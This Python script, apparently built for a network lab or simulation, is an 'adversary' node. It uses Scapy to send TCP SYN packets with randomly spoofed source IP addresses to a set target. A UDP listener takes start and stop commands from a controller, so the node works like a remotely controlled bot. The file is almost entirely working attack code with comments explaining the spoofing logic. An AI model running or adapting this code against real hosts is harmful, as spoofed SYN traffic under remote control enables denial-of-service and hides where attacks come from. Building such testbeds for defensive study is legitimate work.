# adversary.py
from scapy.all import IP, TCP, send
import socket
import threading
import random
import time
import json

# --- Configuration ---
# IP of the machine running the controller script
CONTROL_HOST = "127.0.0.1" 
CONTROL_PORT = 9000

# The target for the spoofed packets
TARGET_IP = "10.10.0.2"
TARGET_PORT = 8080
# --- End Configuration ---

# Global flag to control the attack thread's state
running = False

def spoof_attack():
    """
    This function runs in a separate thread. When the 'running' flag is True,
    it continuously sends spoofed TCP SYN packets to the target.
    """
    while True:
        if running:
            # --- IP Spoofing Core Logic ---
            # 1. Generate a fake (spoofed) source IP address.
            # This makes the packet appear to come from a random machine on the network.
            spoof_ip = f"10.10.1.{random.randint(2, 254)}"
            
            # 2. Craft the raw packet using Scapy.
            # We create an IP header with the *spoofed* source IP and the real target IP.
            # We then add a TCP header for a SYN packet (flags="S") to initiate a connection.
            # The target will send its reply (SYN-ACK) to the fake 'spoof_ip', which will go nowhere.
            packet = IP(src=spoof_ip, dst=TARGET_IP) / TCP(dport=TARGET_PORT, sport=random.randint(1024, 65535), flags="S")
            
            # 3. Send the packet without printing Scapy's default output.
            send(packet, verbose=False)
            
            print(f"[*] Sent spoofed packet from {spoof_ip} to {TARGET_IP}:{TARGET_PORT}")
            time.sleep(1)  # Wait for 1 second before sending the next packet
        else:
            # If the attack is stopped, sleep to prevent a high-CPU wait loop
            time.sleep(1)

def control_listener():
    """
    Listens for commands from the controller to start/stop the attack.
    """
    global running
    
    # Create a UDP socket to communicate with the controller
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_address = (CONTROL_HOST, CONTROL_PORT)

    # Announce presence to the controller by sending a "join" packet
    join_packet = {"type": "join", "role": "adversary"}
    sock.sendto(json.dumps(join_packet).encode('utf-8'), server_address)
    print(f"[*] Adversary node has joined the controller at {CONTROL_HOST}:{CONTROL_PORT}")

    # Listen indefinitely for commands
    while True:
        try:
            # Wait to receive data from the controller
            data, _ = sock.recvfrom(1024) 
            
            # Decode the received JSON packet
            packet = json.loads(data.decode('utf-8'))
            command = packet.get("type")

            # Check the command and update the 'running' state
            if command == "start" and not running:
                running = True
                print("\n[+] Received START command. Adversary attack initiated.")
            elif command == "stop" and running:
                running = False
                print("\n[-] Received STOP command. Adversary attack halted.")

        except (json.JSONDecodeError, UnicodeDecodeError):
            print("[!] Warning: Received a malformed packet from the controller.")
        except Exception as e:
            print(f"[!] An error occurred in the listener: {e}")
            break

if __name__ == "__main__":
    # Start the attack function in a background thread
    attack_thread = threading.Thread(target=spoof_attack, daemon=True)
    attack_thread.start()

    # Start the main listener function to wait for controller commands
    control_listener()
